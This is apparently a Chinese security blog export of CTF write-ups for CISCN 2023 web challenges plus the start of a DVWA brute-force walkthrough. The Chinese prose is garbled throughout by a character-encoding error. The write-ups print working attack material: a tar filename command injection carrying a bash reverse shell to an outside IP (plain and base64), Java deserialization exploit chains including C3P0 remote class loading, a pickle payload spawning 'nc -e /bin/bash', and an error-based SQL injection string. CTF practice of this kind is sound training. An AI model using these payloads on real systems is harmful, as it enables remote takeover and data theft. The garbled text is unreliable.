æˆåŠŸä¸Šä¼ ï¼Œç„¶åå°±åœ¨./flaskå»å‘½ä»¤æ‰§è¡Œï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“è¯¥è·¯ç”±è·å–nameæ˜¯c.DefaultQueryï¼Œå› æ­¤éœ€è¦æ„é€  ?name=?name=env//è¿™æ ·æ‹¼æ¥ä»¥åæ‰æ˜¯http://127.0.0.1:5000/?name=env å‚è€ƒæ–‡ç«  [CISCN 2023 åˆèµ›]go_session 2023 CISCN åˆèµ› Web Writeup [CISCN 2023 åˆèµ›]go_session [CISCN 2023 ååŒ—]pysym from flask import Flask, render_template, request, send_from_directory import os import random import string app = Flask(__name__) app.config['UPLOAD_FOLDER']='uploads' #å®šä¹‰ä¸Šä¼ è·¯å¾„ @app.route('/', methods=['GET']) def index(): return render_template('index.html') @app.route('/',methods=['POST']) def POST(): #åˆ¤æ–­æ˜¯å¦æœ‰æ–‡ä»¶å­˜åœ¨ if 'file' not in request.files: return 'No file uploaded.' file = request.files['file'] #åˆ¤æ–­æ–‡ä»¶å¤§å° if file.content_length &gt; 10240: return 'file too lager' #ç”Ÿæˆä¸Šä¼ è·¯å¾„ path = ''.join(random.choices(string.hexdigits, k=16)) #ç”Ÿæˆæœ€ç»ˆä¸Šä¼ è·¯å¾„,æ‹¼æ¥uploads directory = os.path.join(app.config['UPLOAD_FOLDER'], path) #åˆ›å»ºæ–‡ä»¶å¤¹ os.makedirs(directory, mode=0o755, exist_ok=True) #ç”Ÿæˆæœ€ç»ˆæ–‡ä»¶çš„ä¿å­˜è·¯å¾„ savepath=os.path.join(directory, file.filename) file.save(savepath) try: #å¯¹æŒ‡å®šæ–‡ä»¶è§£å‹åˆ°æŒ‡å®šç›®å½• os.system('tar --absolute-names -xvf {} -C {}'.format(savepath,directory)) except: return 'something wrong in extracting' links = [] for root, dirs, files in os.walk(directory): for name in files: extractedfile =os.path.join(root, name) #æ£€æŸ¥æ˜¯å¦å­˜åœ¨ç¬¦å·é“¾æ¥ if os.path.islink(extractedfile): os.remove(extractedfile) return 'no symlink' #æ£€æŸ¥æ˜¯å¦ä¸ºç›®å½• if os.path.isdir(path) : return 'no directory' links.append(extractedfile) return render_template('index.html',links=links) @app.route(\"/uploads/&lt;path:path&gt;\",methods=['GET']) def download(path): #ä¸‹è½½æ–‡ä»¶ filepath = os.path.join(app.config['UPLOAD_FOLDER'], path) if not os.path.isfile(filepath): return '404', 404 return send_from_directory(app.config['UPLOAD_FOLDER'], path) if __name__ == '__main__': app.run(host='0.0.0.0',port=1337) ç»åˆ†æï¼Œä¸Šè¿°çš„os.system('tar --absolute-names -xvf {} -C {}'.format(savepath,directory)) è¿™ä¸€å¤„ä»£ç çš„savepathå¯æ§ï¼Œå¯é€ æˆrce å…ˆé€šè¿‡ | è¿æ¥ç¬¦å·ç»•è¿‡ï¼Œå†ç”¨åå¼¹æŒ‡ä»¤è¿›è¡Œbase64ç¼–ç ç»•è¿‡ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„è¿‡æ»¤ã€‚ test.tar | echo bash -c 'bash -i &gt;&amp; /dev/tcp/124.220.233.26/8888 0&gt;&amp;1' | base64 -d | bash | #base64ç¼–ç  test.tar | echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi84ODg4ICAwPiYxJw== | base64 -d | bash | å‘é€ä¹‹å‰è®°å¾—å¼€å¯ç›‘å¬ å‚è€ƒæ–‡ç«  CISCNå¾€å±Šå›½èµ›å¤ç° ciscn2023ååŒ—èµ›åŒº [CISCN 2023 åˆèµ›]DeserBug æ‰¾äº†å‡ ç¯‡æ–‡ç« ï¼Œéƒ½æ˜¯åŸºæœ¬ç›´æ¥ç»™å‡ºç­”ï¼ˆéƒ½æ˜¯è€æ‰‹äº†ï¼Œä¸å±‘äºï¼‰ï¼ŒJavaæ²¡åšè¿‡å‡ æ¬¡ï¼Œå°±æ˜¯ä¸ªèœé¸Ÿï¼Œè¿™é‡Œä¸‹å»è¡¥ï¼Œç›´æ¥ç»™å‡ºç­”æ¡ˆäº†ï¼Œä»Šåå­¦ä¼šå†è¯´ã€‚ è¿™é“é¢˜æ˜¯Javaç»å…¸CCé“¾çš„ç¿»ç‰ˆï¼š import cn.hutool.json.JSONObject; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.util.Base64; import java.util.HashMap; import java.util.Map; import static com.app.Tools.getBytes; import static com.app.Tools.setFieldValue; import static com.app.Tools.*; public class POC { public static void main(String[] args) throws Exception { byte[] bytes = getBytes(\"Evil\"); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_name\", \"Sentiment\"); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes}); Myexpect myexpect = new Myexpect(); myexpect.setTargetclass(TrAXFilter.class); myexpect.setTypeparam(new Class[]{Templates.class}); myexpect.setTypearg(new Object[]{templates}); JSONObject jsonObject = new JSONObject(); ConstantTransformer transformer = new ConstantTransformer(1); Map outerMap = LazyMap.decorate(jsonObject,transformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap , \"Sentiment\"); HashMap hashMap = new HashMap(); hashMap.put(tiedMapEntry, \"1\"); jsonObject.remove(\"Sentiment\"); setFieldValue(transformer,\"iConstant\",myexpect); byte[] serialize = serialize(hashMap); System.out.println(Base64.getEncoder().encodeToString(serialize)); //unserialize(serialize); } } å‚è€ƒæ–‡ç«  2023 CISCN åˆèµ› Web Writeup [CISCN 2023]â€”DeserBug [CISCN 2023 è¥¿å—]dataapi å†³èµ›é¢˜ç›®ï¼Œçœ‹ä¸æ‡‚ï¼Œå‘å¸ƒwpçš„äººä¹Ÿå°‘ï¼Œç•™ç€å§ï¼Œâ”­â”®ï¹â”­â”® å‚è€ƒæ–‡ç«  CISCNè¥¿å—å¤èµ›AWDPlus Web [CISCN 2023 ååŒ—]normal_snake åˆæ˜¯Javaååºåˆ—åŒ–ï¼Œçœ‹ä¸æ‡‚ã€‚ã€‚ã€‚è€ƒçš„æ˜¯C3P0åˆ©ç”¨é“¾ï¼šEXPå¦‚ä¸‹ public class Main2 { private static String string = \"\"; private static byte[] data; public static void main(String[] args) throws Exception { //URLClassLoader C3P0DataSource c3P0DataSource = new C3P0DataSource(); Class clazz = Class.forName(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\"); Constructor declaredConstructor = clazz.getDeclaredConstructor(); declaredConstructor.setAccessible(true); PoolBackedDataSourceBase poolBackedDataSourceBase = (PoolBackedDataSourceBase)declaredConstructor.newInstance(); setFieldValue(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\",poolBackedDataSourceBase,\"connectionPoolDataSource\",c3P0DataSource); serialize(poolBackedDataSourceBase); //unserialize(); String hexAscii = ByteUtils.toHexAscii(data); System.out.println(hexAscii); String poc = \"!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt; {userOverridesAsString: \\\"HexAsciiSerializedMap:\" +hexAscii+ \";\\\"}\"; System.out.println(poc); Yaml yaml = new Yaml(); //yaml.load(poc); } public static void setFieldValue(String className,Object object, String field_name, Object field_value) throws Exception { Class clazz = Class.forName(className); Field declaredField = clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,field_value); } public static void serialize(Object object) throws Exception { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(object); //string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); data = byteArrayOutputStream.toByteArray(); } public static void unserialize() throws Exception { //ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string)); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); } } class C3P0DataSource implements ConnectionPoolDataSource, Referenceable { @Override public Reference getReference() throws NamingException { Reference reference = new Reference(\"Payload8\",\"Payload8\",\"http://127.0.0.1:5555/payload8.jar\"); //Reference reference = new Reference(\"Payloadxx\",\"Payloadxx\",\"\"); return reference; } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } å‚è€ƒæ–‡ç«  2023 ååŒ—åˆ†åŒºèµ› normal_snake è®°å‡ é“CTF-Javaååºåˆ—åŒ–é¢˜ç›® [CISCN 2023 ååŒ—]ExifT0ol import web import os import exifread web.config.debug = False#å…³é—­è°ƒå¼æ¨¡å¼ #å®šä¹‰urlè·¯ç”± urls = ( '/', 'Index', '/upload', 'Upload', '/exifhandler', 'ExifHandler' ) app = web.application(urls, locals()) #ä¼ å…¥äº†è·¯ç”±æ˜ å°„å’Œlocals()ä½œä¸ºå‚æ•°ã€‚ render = web.template.render('templates/')#ç”¨äºæ¸²æŸ“æ¨¡æ¿æ–‡ä»¶ session = web.session.Session(app, web.session.DiskStore(\"sessions\"), initializer={'filename': '', 'filedir': '', 'exif': {}})#ç”¨äºå­˜å‚¨ä¼šè¯ä¿¡æ¯ï¼Œå¹¶åˆå§‹åŒ–äº†filenameã€filedirå’Œexifä¸‰ä¸ªå±æ€§ã€‚ class Index: def GET(self): return render.upload()#æ˜¾ç¤ºä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ class Upload: def GET(self): return render.upload() #æ˜¾ç¤ºä¸Šä¼ æ–‡ä»¶çš„è¡¨å• def POST(self): params = web.input(file={})#è·å–ä¸Šä¼ æ–‡ä»¶å¯¹è±¡ filedir = 'uploads/'#è®¾ç½®é—®æ–‡ä»¶ä¸Šä¼ æ‰€ä¿å­˜çš„ç›®å½• if 'file' in params: #å¦‚æœè¯·æ±‚ä¸­åŒ…å«æ–‡ä»¶å¯¹è±¡'file'ï¼Œåˆ™è·å–æ–‡ä»¶åå¹¶æå–æ–‡ä»¶åç¼€ filename = params['file'].filename fileext = filename.split('.')[-1] #å¦‚æœä¸æ˜¯æŒ‡å®šçš„åç¼€ï¼Œåˆ™ç»™å‡ºè­¦å‘Šï¼Œä½†å¹¶ä¸ä¼šç›´æ¥returnï¼ˆä¹Ÿå°±æ˜¯æ²¡å½±å“ï¼‰ if fileext.lower() not in ['jpg', 'jpeg', 'png', 'gif']: print('Warning: only allow jpg, jpeg, png, gif!') #å°†æ–‡ä»¶åå’Œæ–‡ä»¶ç›®å½•ä¿å­˜åˆ°ä¼šè¯çš„filenameå’Œfiledirå±æ€§ä¸­ã€‚ session.filename = filename session.filedir = filedir #æ‰“å¼€æ–‡ä»¶å¹¶å°†æ–‡ä»¶å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œå…³é—­æ–‡ä»¶ã€‚ fout = open(filedir + filename, 'wb') fout.write(params['file'].value) fout.close() return \"&lt;script&gt;alert('successfully uploaded');window.location.href='/exifhandler'&lt;/script&gt;\" else: return 'no file' class ExifHandler: def GET(self): #æ£€æŸ¥ä¼šè¯ä¸­çš„filenameå’Œexifå±æ€§æ˜¯å¦ä¸ºç©ºï¼Œä»¥ç¡®å®šæ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ å’Œæ˜¯å¦å·²ç»è·å–è¿‡EXIFä¿¡æ¯ã€‚ if session.filename != '' and session.exif == {}: #æ‰“å¼€ä¸Šä¼ çš„æ–‡ä»¶å¹¶ä½¿ç”¨exifread.process_file(f)æ–¹æ³•å¤„ç†æ–‡ä»¶ï¼Œå°†ç»“æœä¿å­˜åˆ°tagså˜é‡ä¸­ã€‚ with open(session.filedir + session.filename, 'rb') as f: tags = exifread.process_file(f) exif_info = {} #éå†tagså­—å…¸ï¼Œå°†ä»¥'EXIF'å¼€å¤´çš„æ ‡ç­¾å’Œå¯¹åº”çš„å€¼ä¿å­˜åˆ°exif_infoå­—å…¸ä¸­ã€‚ for tag, value in tags.items(): if tag.startswith('EXIF'): exif_info[tag] = str(value) session.exif = exif_info #å°†exif_infoä¿å­˜åˆ°ä¼šè¯çš„exifå±æ€§ä¸­ï¼Œç„¶åä½¿ç”¨render.resultæ–¹æ³•æ¸²æŸ“ç»“æœé¡µé¢ï¼Œå¹¶å°†filenameå’Œexif_infoä¼ é€’ç»™æ¨¡æ¿è¿›è¡Œæ˜¾ç¤ºã€‚ return render.result(filename=session.filename, exif_info=exif_info) elif session.filename == '' and session.exif == {}: return \"&lt;script&gt;alert('no file uploaded');window.location.href='/'&lt;/script&gt;\" else: return render.result(filename=session.filename, exif_info=session.exif) if __name__ == '__main__': app.run() åˆ†äº†ä¸Šè¿°ä»£ç åœ¨ç»“åˆwpï¼Œè¿™é“é¢˜å°±æ˜¯é€šè¿‡ä¸Šä¼ æ–‡ä»¶æ¥è¦†ç›–sessionæ–‡ä»¶ï¼Œè¦†ç›–ä¹‹åï¼Œä¼šè‡ªåŠ¨ç»è¿‡ExifHandlerè·¯ç”±è¿›è¡Œå¤„ç†ï¼Œæœ€ç»ˆä¼šé€šè¿‡æ¨¡æ¿æ¸²æŸ“å›æ˜¾åˆ°é¡µé¢ï¼ˆåº”è¯¥å°±æ˜¯è¿™é‡Œä¼šé€ æˆæ¼æ´ï¼‰ æ—¢ç„¶æ˜¯sessionæ–‡ä»¶ï¼Œé‚£å°±å¾—åˆ©ç”¨ååºåˆ—åŒ–ï¼Œä»¥åºåˆ—åŒ–æ•°æ®å­˜å…¥ï¼Œæœ€ç»ˆæ¸²æŸ“çš„æ—¶å€™ååºåˆ—åŒ–ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ è™½ç„¶ä¸Šè¿°æœ‰ç™½åå•çš„æ£€æŸ¥ï¼Œä½†æ˜¯æ²¡æœ‰returnä¹‹ç±»çš„ï¼Œåªæ˜¯å•çº¯çš„è­¦å‘Šï¼Œå› æ­¤æ— ç”¨ã€‚ ç”±äºfilenameæ˜¯å¯æ§çš„,è€Œä¸”ä¹Ÿæ²¡æœ‰å¯¹å…¶åšä»»ä½•è¿‡æ»¤ï¼Œæ­¤å¤„å°±ä¼šæœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ å…ˆæ„é€ payload import itsdangerous import pickle, pickletools import os class test(): def __init__(self): self.name = \"test\" def __reduce__(self): return (os.system, (\"nc ip port -e /bin/bash\", )) a = pickletools.optimize((pickle.dumps(test(), 4))) print(itsdangerous.base64_encode(a)) è¿™é‡Œä¸æ¸…æ¥šçš„ç‚¹å°±æ˜¯ä¸ºä½•åœ¨æ„é€ payloadåšäº†é‚£äº›ä¼˜åŒ–ï¼Œæœ€åè¿˜æ˜¯ç¼–ç äº†ä¸€ä¸‹ å°†è„šæœ¬è¾“å‡ºå†…å®¹ä¸Šä¼ åˆ° sessionsç›®å½•ä¸‹çš„888 çš„æ–‡ä»¶ä¸­ è¿™é‡Œæœ€åæ²¡æœ‰å¤ç°æˆåŠŸã€‚ã€‚ã€‚çœŸçš„éš¾å— å‚è€ƒæ–‡ç«  æ˜¥ç§‹æ¯æ˜¥å­£è”èµ›&amp;&amp;ciscn2023ååŒ—èµ›åŒºéƒ¨åˆ†é¢˜è§£ å‚è€ƒæ–‡ç«  SSTIï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰æ¼æ´ï¼ˆå…¥é—¨ç¯‡ï¼‰ [CISCN 2019åä¸œå—]Web11 é¢˜è§£ åˆ·é¢˜è®°å½•ï¼š[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World --BUUCTF [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox CISCN 2019 åˆèµ› Love Math åˆ·é¢˜è®°å½•ï¼š[CISCN 2019 åˆèµ›]Love Math [CISCN 2019åä¸œå—]Web4 BUUCTFï¼š[CISCN2019 åä¸œå—èµ›åŒº]Web4 [CISCN2019 åä¸œå—èµ›åŒº]Double Secret","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"é‡æ¸©DVWA","path":"/2024/01/10/shen-ru-dvwa/","content":"0x01 Brute Force Low è¿™ä¸€éƒ¨åˆ†å¤„ç†ç”¨æˆ·è¾“å…¥çš„usernameä¸password(md5åŠ å¯†) // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die ( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); æ„é€ æŸ¥è¯¢è¯­å¥ï¼ˆå¤„ç†ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ï¼‰æ¥ç€ä¸æ•°æ®åº“è¿æ¥ï¼Œè¿›å…¥æ•°æ®åº“è¿›è¡ŒåŒ¹é…æŸ¥è¯¢ mysqli_query: è¿™æ˜¯ MySQLi æ‰©å±•æä¾›çš„å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œ SQL æŸ¥è¯¢ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¿æ¥æ ‡è¯†ç¬¦ï¼Œé€šå¸¸ä½¿ç”¨å…¨å±€å˜é‡ $GLOBALS[\"___mysqli_ston\"]ï¼Œç¬¬äºŒä¸ªå‚æ•°åŒ…å«sqlæŸ¥è¯¢çš„å­—ç¬¦ä¸² or die...å¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œå°±ä¼šæ‰§è¡Œdieåé¢çš„ä»£ç ï¼šåé¢çš„ä»£ç ç”¨äºè·å–å¹¶è¾“å…¥MySQLé”™è¯¯ä¿¡æ¯ã€‚ é¦–å…ˆåˆ¤æ–­$GLOBALS[\"___mysqli_ston\"]æ˜¯å¦ä¸ºå¯¹è±¡ï¼Œå¦‚æœæ˜¯ï¼Œè¿™è¯´æ˜æ˜¯å­˜åœ¨è¿æ¥é”™è¯¯ï¼Œå¹¶ç”¨mysqli_errorå‡½æ•°è·å–å…·ä½“çš„é”™è¯¯ä¿¡æ¯ï¼›å¦‚æœä¸æ˜¯å¯¹è±¡ï¼Œåˆ™ç”¨mysqli_connect_errorè·å–é”™è¯¯ä¿¡æ¯ if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;\"; echo \"&lt;img src=\\\"{$avatar}\\\" /&gt;\"; } else { // Login failed echo \"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"; } mysqli_num_rowsç”¨äºè·å–ç»“æœä¸­çš„è¡Œæ•° å¦‚æœæŸ¥è¯¢åˆ°äº†è¿”å›ç»“æœï¼Œå¹¶ä¸”è¿”å›çš„ç»“æœè¡Œæ•°ä¸º1ï¼Œè¿™è¯´æ˜æˆåŠŸæ‰¾åˆ°å¯¹åº”çš„ç”¨æˆ·æ•°æ® mysql_fetch_assoc ä»ç»“æœä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œå¹¶è·å–è¯¥å…³è”æ•°ç»„é”®å€¼ä¸ºavatarå¯¹åº”çš„valueï¼Œéšåå°±æ˜¯ä¸€äº›ä¿¡æ¯çš„å±•ç¤º è°ƒç”¨mysqli_closeå…³é—­MySQLè¿æ¥ï¼Œå¹¶å°†å…³é—­ç»“æœçš„å¸ƒå°”å€¼èµ‹å€¼ä¸ºå¯¹åº”çš„å˜é‡ï¼Œå¦‚æœæˆåŠŸå…³é—­ï¼Œè¿”å›falseï¼›å¦åˆ™è¿”å›å˜é‡æœ¬èº«çš„value ç»¼ä¸Šåˆ†æï¼Œè¯¥ç½‘ç«™å¯¹äºç”¨æˆ·çš„ç™»å½•æ¬¡æ•°å¹¶æ²¡æœ‰åšå‡ºä»»ä½•é™åˆ¶ï¼Œå¯ä»¥å°½æƒ…çš„çˆ†ç ´ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„ä»£ç ä¹Ÿæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œè¿™è¡¨æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡sqlæ³¨å…¥è¿›å»ã€‚ä½†è¿™é‡Œä¸èƒ½ä½¿ç”¨è”åˆæ³¨å…¥ï¼Œå› ä¸ºå¹¶ä¸ä¼šå›å›æ˜¾ç›¸å…³æŸ¥è¯¢ä¿¡æ¯ã€‚ ä½†å¹¸è¿çš„æ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸‡èƒ½å¯†ç å’ŒæŠ¥é”™æ³¨å…¥ï¼ˆå› ä¸ºmysql_errorçš„å­˜åœ¨ï¼‰ username=admin'+and+updatexml(1,concat(0x7e,(select version())),1)--+&amp;password=bug&amp;Login=Login# å½“ç„¶ç›²æ³¨ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†æ‰‹å·¥æ•ˆç‡ä½ Medium ä¸­çº§æ°´å¹³å¦‚ä¸Šæ‰€ç¤ºã€‚åœ¨å¼€å§‹çš„åœ°æ–¹ï¼Œåˆ†åˆ«å¯¹ç”¨æˆ·è¾“å…¥çš„usernameä¸passwordæ•°æ®ç”±mysqli_real_escape_stringè¿›è¡Œå¤„ç†ï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œç‰¹æ®Šå­—ç¬¦å¦‚ä¸‹ å‰©ä¸‹çš„åŸºæœ¬ä¸€è‡´ï¼Œäº®ç‚¹åœ¨äºï¼Œè¿™é‡Œå¦‚æœç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¸æ•°æ®åº“æ•°æ®ä¸åŒ¹é…ï¼Œåˆ™ä¼šsleep 2ï¼Œä¼‘çœ 2ç§’ã€‚ä½†è¿™å¯¹æˆ‘ä»¬çš„çˆ†åŠ›ç ´è§£æ˜¯æ— ç”¨çš„ï¼Œåªä¸è¿‡å»¶é•¿äº†æˆ‘ä»¬çˆ†ç ´çš„æ—¶é—´ High checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); é¦–å…ˆè°ƒç”¨äº†ä¸ªè‡ªå®šä¹‰å‡½æ•°checkTokenï¼Œå¹¶å‘å…¶ä¸­ä¼ å…¥ç”¨æˆ·çš„ä»¤ç‰Œä»¥åŠsessionä¼šè¯ å¹¶ä¸”åœ¨å¯¹ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç è¾“å…¥æ–¹é¢æ·»åŠ äº†$user = stripslashes( $user );è¿›è¡Œå¤„ç†ï¼Œstripslashesåœ¨äºåˆ é™¤ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¸­å¯èƒ½å«æœ‰çš„åå¼•å·``` è¿™é‡Œä¾æ—§åŒä¹‹å‰çš„éš¾åº¦åŸºæœ¬ä¸€è‡´ï¼Œä¸è¿‡ç¡çœ æ—¶é—´æˆäº†éšæœºäº† æœ€åè¿™é‡Œè¯´è¯¥å‡½æ•°æ˜¯ç”¨æ¥ç”ŸæˆCSRFä»¤ç‰Œçš„ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™é‡Œé˜²æ­¢äº†CSRFçš„æ”»å‡»ï¼Œä½†æˆ‘ä»¬ä»å¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œä¸è¿‡éº»çƒ¦çš„äº‹éœ€è¦åœ¨æ¯æ¬¡ç ´è§£çš„æ—¶å€™ï¼ŒæŠ“å–é¡µé¢çš„ä»¤ç‰Œtoken è¿™é‡Œæˆ‘ä»¬å…³æ³¨ä¸€ä¸‹tokençš„å¤„ç†ï¼ŒToken çš„å€¼æ¥æºäº index.phpï¼Œè®¿é—® index.php æŸ¥çœ‹æºç ä¿¡æ¯ï¼Œæ‰¾åˆ°å¦‚ä¸‹ token çš„ä½ç½®ï¼š require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php'; æˆ‘ä»¬è¿½è¸ªä½ç½®ï¼Œå‘ç°å¦‚ä¸‹ä»£ç ï¼š è¿™é‡Œçš„checktokenç”¨äºæ£€æŸ¥ç”¨æˆ·ä»¤ç‰Œã€‚å¦‚æœç”¨æˆ·ä»¤ç‰Œä¸sessionä¼šè¯ä¸ç›¸ç­‰ï¼Œåˆ™æŠ¥é”™ï¼Œå¹¶ä¸”è¿˜ä¼šé‡å®šå‘åˆ°index.phpï¼›è€Œåç»­çš„generateå‡½æ•°ç”¨å½“å‰çš„æ—¶é—´æˆ³md5å€¼æ¥ç”Ÿæˆsessionï¼Œè¿™é‡Œå¤ä¹ ä¸€æ³¢å¦‚ä½•ç”¨burpsuiteæ¥çˆ†ç ´ æŠ“åŒ…çœ‹åˆ°è¿™é‡Œå¤šäº†ä¸¤ä¸ªå‚æ•°ï¼Œä½†åªéœ€è¦å…³æ³¨tokenå³å¯ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œå«æœ‰302é‡å®šå‘ï¼Œå› æ­¤æˆ‘ä»¬åœ¨bpè®¾ç½®çš„æ—¶å€™éœ€è¦è·Ÿéšä»¥ä¾¿è·å–index.phpé¡µé¢çš„æŸäº›æ•°æ® è¿™é‡Œçœ‹åˆ°æ–‡ç« è¯´çº¿ç¨‹æœ€å¥½è®¾ç½®ä¸º1ï¼Œå¤šçº¿ç¨‹åŸºæœ¬ä¸è¡Œ è¿™é‡Œæˆ‘ä»¬è®¾ç½®çˆ†ç ´ç‚¹ä¸ºpasswordä¸tokenï¼Œå…¶ä¸­payload 1 ä¸ºæ­£å¸¸çš„å¯†ç å­—å…¸å³å¯ã€‚payload2è®¾ç½®ä¸ºé€’å½’æå– é€’å½’grep ï¼ˆRecursive grepï¼‰ ä¸»è¦ç”¨äºä»æœåŠ¡å™¨ç«¯æå–æœ‰æ•ˆæ•°æ®ï¼Œéœ€å…ˆä»æœåŠ¡å™¨å“åº”ä¸­æå–æ•°æ®åœ¨æ›¿æ¢payloadä½ç½®è¿›è¡Œæ­£åˆ™é…ç½® æ³¨æ„ï¼šä½¿ç”¨é€’å½’æœç´¢æ—¶çº¿ç¨‹å¿…é¡»æ˜¯1 æ ¹æ®ä¸Šè¿°å›¾ç‰‡çš„æ­¥éª¤è®¾ç½®å¥½ï¼Œå¯¹äºtokençš„æŸ¥æ‰¾ï¼Œæˆ‘ä»¬åœ¨å›¾ç‰‡å³ä¾§é€‰æ‹©è·å–å“åº”ï¼Œæ¥ç€åœ¨ä¸‹é¢çš„å“åº”ä¸­æ‰¾åˆ°tokenæ‰€åœ¨ä½ç½®ï¼Œé¼ æ ‡é€‰ä¸­å³å¯ï¼Œæ¥ç€ä½ ä¼šçœ‹åˆ°ä¸Šæ–¹å·²ç»è‡ªåŠ¨ç”Ÿæˆå¥½äº†æ­£åˆ™è¡¨è¾¾å¼ å¦‚ä¸Šå›¾æˆåŠŸçˆ†ç ´ Impossible å‰é¢çš„æŸäº›éƒ¨åˆ†ä¸Highä¸€èˆ¬ï¼Œæˆ‘ä»¬é‡ç‚¹çœ‹æ–°å¢çš„ $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );: åˆ›å»ºä¸€ä¸ª PDO å‡†å¤‡è¯­å¥ï¼ˆprepared statementï¼‰ï¼Œè¯¥è¯­å¥ç”¨äºæ‰§è¡Œ SQL æŸ¥è¯¢ã€‚æŸ¥è¯¢çš„ç›®æ ‡æ˜¯ä»åä¸º â€œusersâ€ çš„è¡¨ä¸­é€‰æ‹© â€œfailed_loginâ€ å’Œ â€œlast_loginâ€ åˆ—çš„å€¼ï¼Œæ¡ä»¶æ˜¯ â€œuserâ€ åˆ—ç­‰äºæä¾›çš„å‚æ•° :userã€‚LIMIT 1 ç¡®ä¿åªè¿”å›ä¸€è¡Œæ•°æ®ã€‚ $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );: ç»‘å®šå‚æ•° :userï¼Œè¿™æ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œä¸é¢„å¤‡è¯­å¥ä¸­çš„ (:user) å¯¹åº”ã€‚å°† $user å˜é‡ç»‘å®šåˆ°è¿™ä¸ªå‚æ•°ï¼Œå¹¶æŒ‡å®šå‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼ˆPDO::PARAM_STRï¼‰ã€‚ ä¹‹åä¾¿æ˜¯æ‰§è¡Œè¯¥PDOè¯­å¥ï¼Œå¹¶è·å–è¿”å›ç»“æœä¸­çš„æ¯ä¸€è¡Œæ•°æ® 